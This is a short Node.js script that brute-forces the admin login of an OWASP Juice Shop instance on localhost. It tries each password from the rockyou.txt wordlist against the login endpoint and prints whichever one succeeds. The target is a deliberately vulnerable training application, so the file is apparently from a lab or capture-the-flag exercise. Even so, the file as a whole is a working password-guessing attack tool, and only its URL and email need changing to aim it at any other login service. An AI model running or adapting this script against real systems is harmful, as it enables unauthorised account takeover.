// Logan L
const axios = require("axios");
const fs = require("fs");
const readline = require("readline");
const cliProgress = require("cli-progress");

const url = "http://localhost:3000/rest/user/login";
const email = "admin@juice-sh.op"
const wordlistPath = "rockyou.txt";

const readLines = async (file) => {
    return new Promise((resolve, reject) => {
        let passwords = [];
        const rl = readline.createInterface({
            input: fs.createReadStream(file),
            crlfDelay: Infinity
        });

        rl.on("line", (line) => passwords.push(line.trim()));
        rl.on("close", () => resolve(passwords));
        rl.on("error", (err) => reject(err));
    });
};

const tryLogin = async (password) => {
    try {
        const response = await axios.post(url, {
            email: email,
            password: password
        });

        if (response.status === 200 && !response.data.error) {
            console.log(`\n[+] Password found: ${password}`);
            process.exit(0);
        }
    } catch (error) {
        if (error.response && error.response.status !== 401) {
            console.error(`\n[!] Error: ${error.message}`);
        }
    }
};

const bruteForce = async () => {
    const passwords = await readLines(wordlistPath);

    console.log(`\n[+] Loaded ${passwords.length} passwords from ${wordlistPath}`);
    
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(passwords.length, 0);

    for (let i = 0; i < passwords.length; i++) {
        const password = passwords[i];
        await tryLogin(password);
        bar.update(i + 1);
    }

    bar.stop();
    console.log("\n[-] No valid password found.");
};

bruteForce();
